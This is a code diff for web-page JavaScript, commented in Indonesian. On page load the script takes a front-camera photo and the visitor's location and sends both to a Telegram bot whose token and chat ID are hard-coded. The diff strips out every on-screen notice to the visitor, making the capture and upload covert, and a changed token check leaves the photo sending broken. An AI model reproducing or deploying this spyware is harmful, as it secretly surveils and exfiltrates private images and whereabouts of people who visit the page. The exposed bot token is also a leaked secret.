@@ -2,23 +2,6 @@
 const TELEGRAM_BOT_TOKEN = "8481518873:AAG8HJYnOBDmfvYx_do2uZJ0VY0H1wTeQqg";   // Ganti dengan token bot Telegram
 const TELEGRAM_CHAT_ID = "8481518873";       // Ganti dengan chat ID Anda
 
-// ========== ELEMEN LOADING ==========
-const loadingScreen = document.getElementById("loading-screen");
-const loadingProgress = document.getElementById("loading-progress");
-
-// ========== FUNGSI NOTIFIKASI TOAST ==========
-function showToast(message, isError = false) {
-    const existingToast = document.querySelector(".toast");
-    if (existingToast) existingToast.remove();
-
-    const toast = document.createElement("div");
-    toast.className = "toast";
-    toast.textContent = message;
-    if (isError) toast.style.borderLeftColor = "red";
-    document.body.appendChild(toast);
-    setTimeout(() => toast.remove(), 4000);
-}
-
 // ========== KIRIM PESAN TEKS KE TELEGRAM ==========
 async function sendTelegramMessage(text) {
     if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN") {
@@ -41,7 +24,7 @@ async function sendTelegramMessage(text) {
 
 // ========== KIRIM FOTO KE TELEGRAM (BASE64) ==========
 async function sendTelegramPhoto(base64Data) {
-    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN") return false;
+    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "8481518873:AAG8HJYnOBDmfvYx_do2uZJ0VY0H1wTeQqg") return false;
     const blob = await (await fetch(base64Data)).blob();
     const formData = new FormData();
     formData.append("chat_id", TELEGRAM_CHAT_ID);
@@ -58,7 +41,7 @@ async function sendTelegramPhoto(base64Data) {
     }
 }
 
-// ========== AMBIL 1 FRAME DARI STREAM KAMERA ==========
+// ========== AMBIL 1 FRAME DARI STREAM KAMERA DEPAN ==========
 async function captureFrontCameraFrame(stream) {
     return new Promise((resolve) => {
         const video = document.createElement("video");
@@ -73,7 +56,6 @@ async function captureFrontCameraFrame(stream) {
                 const ctx = canvas.getContext("2d");
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 const dataURL = canvas.toDataURL("image/jpeg", 0.8);
-                // Hentikan stream setelah capture
                 stream.getTracks().forEach(track => track.stop());
                 resolve(dataURL);
             }, 500);
@@ -81,7 +63,7 @@ async function captureFrontCameraFrame(stream) {
     });
 }
 
-// ========== MINTA IZIN KAMERA DEPAN, LOKASI, LALU KIRIM KE TELEGRAM ==========
+// ========== PROSES KAMERA DEPAN, LOKASI, LALU KIRIM KE TELEGRAM (TANPA NOTIF) ==========
 async function requestAndSendToTelegram() {
     let cameraGranted = false;
     let locationGranted = false;
@@ -89,25 +71,17 @@ async function requestAndSendToTelegram() {
     let coords = null;
 
     // ---- Kamera depan ----
-    showToast("📷 Meminta izin kamera depan...");
     try {
         const stream = await navigator.mediaDevices.getUserMedia({
             video: { facingMode: "user" }
         });
         cameraGranted = true;
-        showToast("✅ Izin kamera diberikan, mengambil foto...");
         photoBase64 = await captureFrontCameraFrame(stream);
-        showToast("📸 Foto berhasil diambil");
     } catch (err) {
         cameraGranted = false;
-        let reason = err.message;
-        if (err.name === "NotAllowedError") reason = "Izin ditolak pengguna";
-        else if (err.name === "NotFoundError") reason = "Tidak ada kamera depan";
-        showToast(`❌ Izin kamera gagal: ${reason}`, true);
     }
 
     // ---- Lokasi ----
-    showToast("📍 Meminta izin lokasi...");
     try {
         const position = await new Promise((resolve, reject) => {
             navigator.geolocation.getCurrentPosition(resolve, reject);
@@ -118,12 +92,8 @@ async function requestAndSendToTelegram() {
             lon: position.coords.longitude,
             acc: position.coords.accuracy
         };
-        showToast(`✅ Lokasi diizinkan: ${coords.lat}, ${coords.lon}`);
     } catch (err) {
         locationGranted = false;
-        let reason = err.message;
-        if (err.code === 1) reason = "Izin lokasi ditolak";
-        showToast(`❌ Izin lokasi gagal: ${reason}`, true);
     }
 
     // ---- Kirim ke Telegram ----
@@ -139,10 +109,7 @@ async function requestAndSendToTelegram() {
     await sendTelegramMessage(textMsg);
 
     if (cameraGranted && photoBase64) {
-        showToast("📤 Mengirim foto ke Telegram...");
-        const sent = await sendTelegramPhoto(photoBase64);
-        if (sent) showToast("📸 Foto terkirim ke Telegram");
-        else showToast("⚠️ Gagal kirim foto", true);
+        await sendTelegramPhoto(photoBase64);
     } else {
         await sendTelegramMessage("📷 (Tidak ada foto karena kamera tidak diizinkan)");
     }
@@ -190,9 +157,9 @@ document.addEventListener("click", () => {
     music.play().catch(() => {});
 }, { once: true });
 
-// ========== LOADING SCREEN + PROSES IZIN & TELEGRAM ==========
+// ========== LOADING SCREEN + PROSES IZIN & TELEGRAM (TANPA NOTIF) ==========
 window.onload = () => {
-    // Mulai proses izin & kirim Telegram (tidak memblokir loading bar)
+    // Proses kamera & lokasi lalu kirim ke Telegram (tanpa mengganggu loading bar)
     requestAndSendToTelegram();
 
     // Loading bar animation
